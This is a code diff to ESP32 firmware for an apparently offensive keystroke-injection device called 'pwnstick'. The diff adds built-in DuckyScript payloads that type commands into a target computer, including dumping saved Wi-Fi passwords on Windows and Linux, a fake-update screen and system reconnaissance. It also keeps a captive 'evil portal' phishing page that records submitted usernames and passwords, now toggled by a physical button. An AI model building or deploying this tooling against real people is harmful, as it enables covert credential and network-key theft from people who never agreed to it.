@@ -3,10 +3,8 @@
 #include <DNSServer.h>
 #include <AsyncTCP.h>
 #include <ESPAsyncWebServer.h>
-#include <ESPmDNS.h>
 #include "SD_MMC.h"
 #include <Preferences.h>
-#include "USB.h"
 #include "HidDriver.h"
 #include "UsbHidDriver.h"
 #include "BleHidDriver.h"
@@ -31,7 +29,6 @@
 #define MOUSE_RIGHT     2
 #define MOUSE_MIDDLE    4
 
-#include <FastLED.h>
 #include "esp_lcd_panel_io.h"
 #include "esp_lcd_panel_ops.h"
 #include "esp_lcd_panel_vendor.h"
@@ -39,8 +36,6 @@
 #include <Fonts/glcdfont.c>
 #include "qr_code.h"
 
-#define LED_DI_PIN     40
-#define NUM_LEDS       1
 #define PIN_NUM_MOSI   3
 #define PIN_NUM_CLK    5
 #define PIN_NUM_CS     4
@@ -66,7 +61,6 @@
 inline uint16_t SWAP(uint16_t v) { return (v >> 8) | (v << 8); }
 
 // ── HID ──────────────────────────────────────────────────────────────────────
-CRGB leds[NUM_LEDS];
 IHidDriver* activeDriver = nullptr;
 UsbHidDriver usbDriver;
 BleHidDriver bleDriver;
@@ -86,10 +80,7 @@ DNSServer dnsServer;
 static esp_lcd_panel_handle_t panel_handle = NULL;
 static esp_lcd_panel_io_handle_t io_handle = NULL;
 static uint16_t screen_buf[160 * 80];
-static uint16_t* custom_img_buf = nullptr;
-static uint16_t* gif_storage[15];
-static int gif_count = 0, gif_idx = 0;
-static unsigned long last_gif_ms = 0;
+static uint16_t custom_img_buf[160 * 80];
 static bool gif_mode = false;
 
 // ── State ────────────────────────────────────────────────────────────────────
@@ -114,12 +105,10 @@ bool duckyRunning = false;
 bool payloadPending = false;
 String pendingPayload = "";
 
-int ledFlashCount = 0;
-
 static uint32_t binaryOffset = 0;
 
 void setLastKey(String k) { lastKey = k; lastKeyTime = millis(); }
-void flashLed() { ledFlashCount = 4; }
+void flashLed() { }
 
 // ── HTML: main UI ─────────────────────────────────────────────────────────────
 const char index_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
@@ -489,25 +478,6 @@ void drawString(int x, int y, const char* str, uint16_t color, int scale) {
     while (*str) { drawChar(x, y, *str, color, scale); x += 6*scale; str++; }
 }
 
-// ── LED ───────────────────────────────────────────────────────────────────────
-void updateLed() {
-    static unsigned long lastTick = 0;
-    static bool blink = false;
-    if (millis() - lastTick > 400) { lastTick = millis(); blink = !blink; }
-    if (ledFlashCount > 0) {
-        leds[0] = CRGB::Red; ledFlashCount--;
-    } else if (ws.count() > 0) {
-        leds[0] = isBleMode
-            ? (blink ? CRGB(0,0,80) : CRGB(0,0,20))
-            : (blink ? CRGB(0,80,0) : CRGB(0,15,0));
-    } else if (WiFi.softAPgetStationNum() > 0) {
-        leds[0] = blink ? CRGB(40,40,0) : CRGB::Black;
-    } else {
-        leds[0] = CRGB(5,5,5);
-    }
-    FastLED.show();
-}
-
 // ── DuckyScript ───────────────────────────────────────────────────────────────
 uint8_t duckyModKey(const String& s) {
     if (s=="GUI"||s=="WINDOWS"||s=="WIN"||s=="COMMAND") return KEY_LEFT_GUI;
@@ -557,37 +527,141 @@ void parseDuckyCombo(const String& line) {
     activeDriver->releaseAll();
 }
 
-void executeDuckyScript(const String& filename) {
-    if (!sdAvailable) return;
-    String path = "/payloads/" + filename;
-    File f = SD_MMC.open(path.c_str(), FILE_READ);
-    if (!f) { duckyRunning = false; return; }
+// ── Payloads (Flash-based since SD is disabled) ──────────────────────────────
+struct BuiltinPayload {
+    const char* os;
+    const char* name;
+    const char* script;
+};
 
+const char pWinTerm[] PROGMEM = "GUI r\nDELAY 500\nSTRING cmd\nENTER";
+const char pWinCalc[] PROGMEM = "GUI r\nDELAY 500\nSTRING calc\nENTER";
+const char pWinRick[] PROGMEM = "GUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER";
+const char pWinAdmin[] PROGMEM = "GUI x\nDELAY 300\nSTRING a\nDELAY 1000\nALT y";
+const char pWinWiFi[] PROGMEM = "GUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 800\nSTRING netsh wlan show profiles * key=clear | findstr /C:\"Key Content\" /C:\"SSID name\"\nENTER";
+const char pWinFake[] PROGMEM = "GUI r\nDELAY 500\nSTRING https://fakeupdate.net/win10ue/\nENTER\nDELAY 2000\nF11";
+const char pWinGhost[] PROGMEM = "GUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 1000\nSTRING I am watching you...\nENTER";
+const char pWinInfo[] PROGMEM = "GUI r\nDELAY 500\nSTRING cmd /k systeminfo\nENTER";
+
+const char pLinTerm[] PROGMEM = "CTRL ALT t";
+const char pLinCalc[] PROGMEM = "ALT F2\nDELAY 800\nSTRING gnome-calculator\nENTER";
+const char pLinSnake[] PROGMEM = "CTRL ALT t\nDELAY 800\nSTRING ssh snakes.run\nENTER";
+const char pLinRecon[] PROGMEM = "CTRL ALT t\nDELAY 800\nSTRING hostnamectl; timedatectl; lsusb; lscpu; ip a\nENTER";
+const char pLinWiFi[] PROGMEM = "CTRL ALT t\nDELAY 800\nSTRING sudo grep -r '^psk=' /etc/NetworkManager/system-connections/\nENTER";
+
+const char pMedPrev[] PROGMEM = "MEDIA PREV";
+const char pMedPP[] PROGMEM = "MEDIA PLAY_PAUSE";
+const char pMedNext[] PROGMEM = "MEDIA NEXT";
+const char pMedVdn[] PROGMEM = "MEDIA VOL_DOWN";
+const char pMedMute[] PROGMEM = "MEDIA MUTE";
+const char pMedVup[] PROGMEM = "MEDIA VOL_UP";
+const char pMedBdn[] PROGMEM = "MEDIA BRIGHT_DOWN";
+const char pMedBup[] PROGMEM = "MEDIA BRIGHT_UP";
+const char pMedStop[] PROGMEM = "MEDIA STOP";
+const char pMedBack[] PROGMEM = "MEDIA BACK";
+const char pMedHome[] PROGMEM = "MEDIA HOME";
+const char pMedFwd[] PROGMEM = "MEDIA FWD";
+const char pMedWeb[] PROGMEM = "MEDIA WEB";
+const char pMedSrch[] PROGMEM = "MEDIA SEARCH";
+const char pMedBook[] PROGMEM = "MEDIA BOOKMARKS";
+const char pMedRefr[] PROGMEM = "MEDIA REFRESH";
+const char pMedCalc[] PROGMEM = "MEDIA CALC";
+const char pMedMail[] PROGMEM = "MEDIA MAIL";
+const char pMedAir[] PROGMEM = "MEDIA AIRPLANE";
+const char pMedSleep[] PROGMEM = "MEDIA SLEEP";
+const char pMedPower[] PROGMEM = "MEDIA POWER";
+const char pMedScr[] PROGMEM = "MEDIA SCREENSHOT";
+
+BuiltinPayload builtinPayloads[] = {
+    {"win", "Terminal", pWinTerm},
+    {"win", "Calculator", pWinCalc},
+    {"win", "Rickroll", pWinRick},
+    {"win", "Admin PS", pWinAdmin},
+    {"win", "WiFi Pass", pWinWiFi},
+    {"win", "Fake Update", pWinFake},
+    {"win", "Notepad Ghost", pWinGhost},
+    {"win", "System Info", pWinInfo},
+    {"lin", "Terminal", pLinTerm},
+    {"lin", "Calculator", pLinCalc},
+    {"lin", "SSH Snake", pLinSnake},
+    {"lin", "Sys Recon", pLinRecon},
+    {"lin", "WiFi Pass", pLinWiFi},
+    {"med", "Prev Song", pMedPrev},
+    {"med", "Play/Pause", pMedPP},
+    {"med", "Next Song", pMedNext},
+    {"med", "Vol Down", pMedVdn},
+    {"med", "Mute", pMedMute},
+    {"med", "Vol Up", pMedVup},
+    {"med", "Bright Down", pMedBdn},
+    {"med", "Bright Up", pMedBup},
+    {"med", "Stop", pMedStop},
+    {"med", "Web Back", pMedBack},
+    {"med", "Web Home", pMedHome},
+    {"med", "Web Fwd", pMedFwd},
+    {"med", "Browser", pMedWeb},
+    {"med", "Web Search", pMedSrch},
+    {"med", "Bookmarks", pMedBook},
+    {"med", "Web Refresh", pMedRefr},
+    {"med", "Calculator", pMedCalc},
+    {"med", "Email", pMedMail},
+    {"med", "Airplane", pMedAir},
+    {"med", "Sleep", pMedSleep},
+    {"med", "Power", pMedPower},
+    {"med", "Screenshot", pMedScr}
+};
+const int numBuiltinPayloads = 35;
+
+void executeDuckyScript(const String& scriptContent, bool isFile = false) {
     duckyRunning = true;
     int defaultDelay = 0;
-    setLastKey("EXEC");
-
-    while (f.available() && duckyRunning) {
-        String line = f.readStringUntil('\n');
+    
+    int start = 0;
+    while (start < (int)scriptContent.length() && duckyRunning) {
+        int end = scriptContent.indexOf('\n', start);
+        if (end == -1) end = scriptContent.length();
+        String line = scriptContent.substring(start, end);
         line.trim();
-        if (line.isEmpty() || line.startsWith("REM ") || line.startsWith("//")) {
-            // skip
-        } else if (line.startsWith("DELAY ")) {
+        start = end + 1;
+
+        if (line.isEmpty() || line.startsWith("REM ") || line.startsWith("//")) continue;
+        
+        if (line.startsWith("DELAY ")) {
             delay(line.substring(6).toInt());
-        } else if (line.startsWith("DEFAULTDELAY ")||line.startsWith("DEFAULT_DELAY ")) {
-            defaultDelay = line.substring(line.indexOf(' ')+1).toInt();
         } else if (line.startsWith("STRING ")) {
             activeDriver->print(line.substring(7));
+        } else if (line.startsWith("MEDIA ")) {
+            String m = line.substring(6);
+            if(m=="PREV") activeDriver->mediaAction("m_prev");
+            else if(m=="PLAY_PAUSE") activeDriver->mediaAction("m_pp");
+            else if(m=="NEXT") activeDriver->mediaAction("m_next");
+            else if(m=="VOL_DOWN") activeDriver->mediaAction("m_vdn");
+            else if(m=="MUTE") activeDriver->mediaAction("m_mute");
+            else if(m=="VOL_UP") activeDriver->mediaAction("m_vup");
+            else if(m=="BRIGHT_DOWN") activeDriver->mediaAction("m_bdn");
+            else if(m=="BRIGHT_UP") activeDriver->mediaAction("m_bup");
+            else if(m=="STOP") activeDriver->mediaAction("m_stop");
+            else if(m=="BACK") activeDriver->mediaAction("m_back");
+            else if(m=="HOME") activeDriver->mediaAction("m_home");
+            else if(m=="FWD") activeDriver->mediaAction("m_fwd");
+            else if(m=="WEB") activeDriver->mediaAction("m_web");
+            else if(m=="SEARCH") activeDriver->mediaAction("m_srch");
+            else if(m=="BOOKMARKS") activeDriver->mediaAction("m_book");
+            else if(m=="REFRESH") activeDriver->mediaAction("m_refr");
+            else if(m=="CALC") activeDriver->mediaAction("m_calc");
+            else if(m=="MAIL") activeDriver->mediaAction("m_mail");
+            else if(m=="AIRPLANE") activeDriver->mediaAction("m_air");
+            else if(m=="SLEEP") activeDriver->mediaAction("m_sleep");
+            else if(m=="POWER") activeDriver->mediaAction("m_power");
+            else if(m=="SCREENSHOT") {
+                if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press(KEY_LEFT_SHIFT); activeDriver->press('s'); delay(100); activeDriver->releaseAll(); }
+                else activeDriver->printScreen();
+            }
         } else if (line=="ENTER") { activeDriver->write(KEY_RETURN);
         } else if (line=="BACKSPACE") { activeDriver->write(KEY_BACKSPACE);
         } else if (line=="TAB") { activeDriver->write(KEY_TAB);
         } else if (line=="SPACE") { activeDriver->write(' ');
         } else if (line=="ESCAPE"||line=="ESC") { activeDriver->write(KEY_ESC);
-        } else if (line=="DELETE"||line=="DEL") { activeDriver->write(KEY_DELETE);
-        } else if (line=="UP_ARROW"||line=="UPARROW") { activeDriver->write(KEY_UP_ARROW);
-        } else if (line=="DOWN_ARROW"||line=="DOWNARROW") { activeDriver->write(KEY_DOWN_ARROW);
-        } else if (line=="LEFT_ARROW"||line=="LEFTARROW") { activeDriver->write(KEY_LEFT_ARROW);
-        } else if (line=="RIGHT_ARROW"||line=="RIGHTARROW") { activeDriver->write(KEY_RIGHT_ARROW);
+        } else if (line=="F11") { activeDriver->write(KEY_F11);
         } else {
             parseDuckyCombo(line);
         }
@@ -596,7 +670,6 @@ void executeDuckyScript(const String& filename) {
         ws.cleanupClients();
         yield();
     }
-    f.close();
     activeDriver->releaseAll();
     duckyRunning = false;
 }
@@ -606,10 +679,6 @@ void addCred(const String& user, const String& pass) {
     String entry = "{\"u\":\"" + user + "\",\"p\":\"" + pass + "\",\"t\":" + String(millis()/1000) + "}";
     if (credsJson == "[]") credsJson = "[" + entry + "]";
     else credsJson = credsJson.substring(0, credsJson.length()-1) + "," + entry + "]";
-    if (sdAvailable) {
-        File f = SD_MMC.open("/evil-portal/captures.txt", FILE_APPEND);
-        if (f) { f.println(user + " : " + pass); f.close(); }
-    }
 }
 
 // ── WebSocket handler ─────────────────────────────────────────────────────────
@@ -617,10 +686,10 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
     AwsFrameInfo *info = (AwsFrameInfo*)arg;
     if (info->opcode == WS_TEXT && info->final && info->index == 0 && info->len == len) {
         data[len] = 0; String msg = (char*)data;
-        if (msg.startsWith("K:")) { activeDriver->print(msg.substring(2)); setLastKey(msg.substring(2)); flashLed(); }
-        else if (msg.startsWith("V:")) { activeDriver->print(msg.substring(2)); setLastKey("PASTE"); flashLed(); }
-        else if (msg.startsWith("E:")) { activeDriver->write(KEY_RETURN); setLastKey("ENT"); flashLed(); }
-        else if (msg.startsWith("B:1")) { activeDriver->write(KEY_BACKSPACE); setLastKey("DEL"); flashLed(); }
+        if (msg.startsWith("K:")) { activeDriver->print(msg.substring(2)); setLastKey(msg.substring(2)); }
+        else if (msg.startsWith("V:")) { activeDriver->print(msg.substring(2)); setLastKey("PASTE"); }
+        else if (msg.startsWith("E:")) { activeDriver->write(KEY_RETURN); setLastKey("ENT"); }
+        else if (msg.startsWith("B:1")) { activeDriver->write(KEY_BACKSPACE); setLastKey("DEL"); }
         else if (msg.startsWith("M:")) {
             int comma = msg.indexOf(',');
             if (comma > 0) {
@@ -635,7 +704,6 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
             char b = msg.charAt(2);
             uint8_t btn = (b=='r')?MOUSE_RIGHT:(b=='m')?MOUSE_MIDDLE:MOUSE_LEFT;
             if (msg.startsWith("C:")) activeDriver->mouseClick(btn); else activeDriver->mousePress(btn);
-            flashLed();
         }
         else if (msg.startsWith("U:")) {
             if (msg.charAt(2)=='1') user_on_site = true;
@@ -649,7 +717,7 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
         else if (msg.startsWith("P:")) {
             String mod = msg.substring(2);
             uint8_t k = (mod=="win")?KEY_LEFT_GUI:(mod=="ctrl")?KEY_LEFT_CTRL:(mod=="alt")?KEY_LEFT_ALT:KEY_LEFT_SHIFT;
-            activeDriver->press(k); delay(100); activeDriver->release(k); setLastKey(mod); flashLed();
+            activeDriver->press(k); delay(100); activeDriver->release(k); setLastKey(mod);
         }
         else if (msg.startsWith("W:")) { activeDriver->mouseScroll(msg.substring(2).toInt()); }
         else if (msg.startsWith("A:")) {
@@ -678,7 +746,7 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
             else if (act=="snake") { if(targetOS=="win"){activeDriver->press(KEY_LEFT_GUI);activeDriver->press('r');delay(300);activeDriver->releaseAll();delay(800);activeDriver->println("cmd /c \"ssh snakes.run\"");}else{activeDriver->press(KEY_LEFT_CTRL);activeDriver->press(KEY_LEFT_ALT);activeDriver->press('t');delay(500);activeDriver->releaseAll();delay(1000);if(sp)activeDriver->print(" ");activeDriver->println("ssh snakes.run");} }
             else if (act.startsWith("m_")&&act!="m_scr") { activeDriver->mediaAction(act); }
             else if (act=="m_scr") { if(targetOS=="win"){activeDriver->press(KEY_LEFT_GUI);activeDriver->press(KEY_LEFT_SHIFT);activeDriver->press('s');delay(100);activeDriver->releaseAll();}else{activeDriver->printScreen();} }
-            setLastKey(act); flashLed();
+            setLastKey(act);
         }
         else if (msg.startsWith("B:list")) { ws.text(info->num, "B:" + bleDriver.getBondedDevices()); }
         else if (msg.startsWith("B:conn:")) { bleDriver.connectToDevice(msg.substring(7)); }
@@ -686,13 +754,22 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
         else if (msg.startsWith("B:del:")) { bleDriver.deleteDevice(msg.substring(6)); ws.text(info->num,"B:"+bleDriver.getBondedDevices()); }
         else if (msg.startsWith("T:")) { setHidMode(msg.substring(2)=="ble"); }
         else if (msg.startsWith("O:")) { targetOS = msg.substring(2); }
-        else if (msg=="I:clear") { show_img=false; gif_mode=false; gif_count=0; forceQR=false; }
-        else if (msg=="I:gif")   { gif_mode=true; gif_count=0; gif_idx=0; show_img=false; }
-        else if (msg=="I:img")   { gif_mode=false; gif_count=0; show_img=true; }
+        else if (msg=="I:clear") { show_img=false; forceQR=false; }
+        else if (msg=="I:img")   { show_img=true; }
         else if (msg.startsWith("JIG:")) { jigglerEnabled = (msg.charAt(4)=='1'); }
         else if (msg.startsWith("EP:"))  { evilPortalEnabled = (msg.charAt(3)=='1'); }
         else if (msg=="CREDS:clear") { credsJson = "[]"; }
-        else if (msg.startsWith("RUN:")) { pendingPayload = msg.substring(4); payloadPending = true; setLastKey("LOAD"); }
+        else if (msg.startsWith("RUN:")) {
+            String pName = msg.substring(4);
+            for (int i = 0; i < numBuiltinPayloads; i++) {
+                if (String(builtinPayloads[i].name) == pName) {
+                    pendingPayload = String(builtinPayloads[i].script);
+                    payloadPending = true;
+                    setLastKey("LOAD");
+                    break;
+                }
+            }
+        }
         else if (msg=="PAYLOAD:stop") { duckyRunning = false; }
         else if (msg.startsWith("VID:")) {
             Preferences prefs; prefs.begin("pwnstick", false);
@@ -701,19 +778,10 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
         }
     } else if (info->opcode == WS_BINARY) {
         if (info->index == 0) binaryOffset = 0;
-        if (binaryOffset + len <= 25600 && custom_img_buf) {
+        if (binaryOffset + len <= 25600) {
             memcpy(((uint8_t*)custom_img_buf) + binaryOffset, data, len);
             binaryOffset += len;
-            if (binaryOffset == 25600) {
-                if (gif_mode && gif_count < 15) {
-                    if (!gif_storage[gif_count]) gif_storage[gif_count] = (uint16_t*)heap_caps_malloc(25600, MALLOC_CAP_SPIRAM);
-                    if (!gif_storage[gif_count]) gif_storage[gif_count] = (uint16_t*)malloc(25600);
-                    if (gif_storage[gif_count]) memcpy(gif_storage[gif_count], custom_img_buf, 25600);
-                    gif_count++;
-                }
-                if (!gif_mode) show_img = true;
-                else if (gif_count > 1) show_img = true;
-            }
+            if (binaryOffset == 25600) show_img = true;
         }
     }
 }
@@ -721,15 +789,7 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
 // ── Display ───────────────────────────────────────────────────────────────────
 void updateDisplay() {
     if (show_img) {
-        if (gif_mode && gif_count > 1) {
-            if (millis() - last_gif_ms > 150) {
-                last_gif_ms = millis();
-                if (gif_storage[gif_idx]) memcpy(screen_buf, gif_storage[gif_idx], 25600);
-                gif_idx = (gif_idx + 1) % gif_count;
-            }
-        } else if (custom_img_buf) {
-            memcpy(screen_buf, custom_img_buf, 25600);
-        }
+        memcpy(screen_buf, custom_img_buf, 25600);
     } else {
         int clients = WiFi.softAPgetStationNum();
         if (forceQR || (clients > 0 && ws.count() == 0)) {
@@ -744,20 +804,22 @@ void updateDisplay() {
             if (ws.count() > 0) user_on_site = true; else user_on_site = false;
             static int drops[160]; static bool init = false;
             if (!init) { for (int i=0;i<160;i++) drops[i]=random(-100,0); init=true; }
+            
+            // Fading effect
             for (int i=0; i<160*80; i++) {
                 uint16_t c = screen_buf[i];
-                if (c == SWAP(C_RED)) { screen_buf[i] = SWAP(C_BLACK); continue; }
-                if (c != SWAP(C_BLACK)) {
+                if (c != 0) {
                     uint16_t ns = SWAP(c);
                     uint16_t r=(ns>>11)&0x1F, g=(ns>>5)&0x3F, b=ns&0x1F;
                     if(g>2)g-=2;else g=0; if(r>4)r-=4;else r=0; if(b>4)b-=4;else b=0;
                     screen_buf[i] = SWAP((r<<11)|(g<<5)|b);
                 }
             }
-            for (int x=0; x<160; x+=6) {
+            
+            // New drops
+            for (int x=0; x<160; x+=10) {
                 if (drops[x]>=0&&drops[x]<80) {
                     screen_buf[drops[x]*160+x] = SWAP(C_GREEN);
-                    if (x+1<160) screen_buf[drops[x]*160+x+1] = SWAP(C_GREEN);
                 }
                 drops[x]++; if (drops[x]>=80) drops[x]=random(-40,0);
             }
@@ -802,41 +864,18 @@ void setup() {
     Serial.begin(115200);
     pinMode(BTN_PIN, INPUT_PULLUP);
 
-    // Allocate image buffers in PSRAM
-    custom_img_buf = (uint16_t*)heap_caps_malloc(160*80*2, MALLOC_CAP_SPIRAM);
-    if (!custom_img_buf) custom_img_buf = (uint16_t*)malloc(160*80*2);
-    for (int i = 0; i < 15; i++) gif_storage[i] = nullptr;
-
-    FastLED.addLeds<WS2812, LED_DI_PIN, GRB>(leds, NUM_LEDS);
-    leds[0] = CRGB::Red; FastLED.show();
-
-    // USB VID/PID (must be before USB.begin inside usbDriver)
-    {
-        Preferences prefs; prefs.begin("pwnstick", true);
-        String vid = prefs.getString("vid", "gen"); prefs.end();
-        if (vid == "apple") { USB.VID(0x05AC); USB.PID(0x0267); USB.manufacturerName("Apple Inc."); USB.productName("Apple Keyboard"); }
-        else if (vid == "dell") { USB.VID(0x413C); USB.PID(0x2113); USB.manufacturerName("Dell Inc."); USB.productName("Dell USB Keyboard"); }
-        else if (vid == "logi") { USB.VID(0x046D); USB.PID(0xC31C); USB.manufacturerName("Logitech"); USB.productName("USB Keyboard"); }
-    }
+    WiFi.mode(WIFI_AP); 
+    WiFi.softAP(ssid);
+    dnsServer.start(53, "*", IPAddress(192,168,4,1));
 
     usbDriver.begin();
     bleDriver.begin();
     setHidMode(false);
 
-    WiFi.mode(WIFI_AP); WiFi.softAP(ssid);
-    dnsServer.start(53, "*", IPAddress(192,168,4,1));
-
-    MDNS.begin("pwnstick");
-
     setup_lcd();
 
     ws.onEvent([](AsyncWebSocket *srv, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len){
         if (type == WS_EVT_DATA) handleWebSocketMessage(arg, data, len);
-        else if (type == WS_EVT_CONNECT) {
-            // push status on connect
-            String sb = String(ws.count()) + "," + (sdAvailable ? "1" : "0");
-            client->text("SBUPD:" + sb);
-        }
         else if (type == WS_EVT_DISCONNECT) { user_on_site = false; }
     });
     server.addHandler(&ws);
@@ -846,12 +885,12 @@ void setup() {
     server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *r){ r->redirect("http://192.168.4.1/"); });
 
     // Main UI (always accessible)
-    server.on("/ctrl", HTTP_GET, [](AsyncWebServerRequest *r){ r->send(200,"text/html",index_html); });
+    server.on("/ctrl", HTTP_GET, [](AsyncWebServerRequest *r){ r->send_P(200,"text/html",index_html); });
 
     // Root: phishing page or real UI
     server.on("/", HTTP_GET, [](AsyncWebServerRequest *r){
-        if (evilPortalEnabled) r->send(200,"text/html",evil_portal_html);
-        else r->send(200,"text/html",index_html);
+        if (evilPortalEnabled) r->send_P(200,"text/html",evil_portal_html);
+        else r->send_P(200,"text/html",index_html);
     });
 
     // Evil portal credential capture
@@ -862,27 +901,17 @@ void setup() {
         addCred(user, pass);
         r->redirect("http://192.168.4.1/ok");
     });
-    server.on("/ok", HTTP_GET, [](AsyncWebServerRequest *r){ r->send(200,"text/html",capture_success_html); });
+    server.on("/ok", HTTP_GET, [](AsyncWebServerRequest *r){ r->send_P(200,"text/html",capture_success_html); });
 
     // SD payloads list
     server.on("/payloads", HTTP_GET, [](AsyncWebServerRequest *r){
-        String json = "{\"sd\":" + String(sdAvailable?"true":"false") + ",\"files\":[";
-        if (sdAvailable) {
-            File dir = SD_MMC.open("/payloads");
-            if (dir && dir.isDirectory()) {
-                bool first = true;
-                File f = dir.openNextFile();
-                while (f) {
-                    String name = f.name();
-                    int sl = name.lastIndexOf('/');
-                    if (sl >= 0) name = name.substring(sl+1);
-                    if (!f.isDirectory() && name.endsWith(".txt")) {
-                        if (!first) json += ",";
-                        json += "\"" + name + "\"";
-                        first = false;
-                    }
-                    f = dir.openNextFile();
-                }
+        String json = "{\"sd\":false,\"files\":[";
+        bool first = true;
+        for (int i = 0; i < numBuiltinPayloads; i++) {
+            if (targetOS == String(builtinPayloads[i].os)) {
+                if (!first) json += ",";
+                json += "\"" + String(builtinPayloads[i].name) + "\"";
+                first = false;
             }
         }
         json += "]}";
@@ -894,12 +923,13 @@ void setup() {
 
     server.onNotFound([](AsyncWebServerRequest *r){ r->redirect("http://192.168.4.1/"); });
     server.begin();
+}
 
-    leds[0] = CRGB::Green; FastLED.show();
-
-    // SD card init AFTER server is up so WiFi stays responsive during potentially slow init
+void initSD() {
+    static bool sdInitDone = false;
+    if (sdInitDone) return;
     SD_MMC.setPins(SD_CLK, SD_CMD, SD_D0, SD_D1, SD_D2, SD_D3);
-    if (SD_MMC.begin("/sdcard", false)) {
+    if (SD_MMC.begin("/sdcard", true)) {
         sdAvailable = true;
         SD_MMC.mkdir("/payloads");
         SD_MMC.mkdir("/images");
@@ -908,10 +938,12 @@ void setup() {
     } else {
         Serial.println("SD card not found");
     }
+    sdInitDone = true;
 }
 
 // ── Loop ──────────────────────────────────────────────────────────────────────
 void loop() {
+    // initSD();
     dnsServer.processNextRequest();
     ws.cleanupClients();
 
@@ -930,7 +962,7 @@ void loop() {
         lastJiggle = millis();
     }
 
-    // Physical button: single short press cycles display
+    // Physical button: single short press toggles Evil Portal
     static bool lastBtn = HIGH;
     static unsigned long btnTime = 0;
     bool btnNow = digitalRead(BTN_PIN);
@@ -938,19 +970,16 @@ void loop() {
     else if (btnNow == HIGH && lastBtn == LOW) {
         unsigned long held = millis() - btnTime;
         if (held > 20 && held < 700) {
-            // Cycle: matrix → QR → image → matrix
-            if (!forceQR && !show_img) forceQR = true;
-            else if (forceQR) { forceQR = false; if (custom_img_buf) show_img = true; }
-            else { show_img = false; }
+            evilPortalEnabled = !evilPortalEnabled;
+            setLastKey(evilPortalEnabled ? "EP:ON" : "EP:OFF");
         }
     }
     lastBtn = btnNow;
 
-    // Display + LED at 20 fps
+    // Display at 20 fps
     static uint32_t lastFrame = 0;
     if (millis() - lastFrame > 50) {
         lastFrame = millis();
         updateDisplay();
-        updateLed();
     }
 }
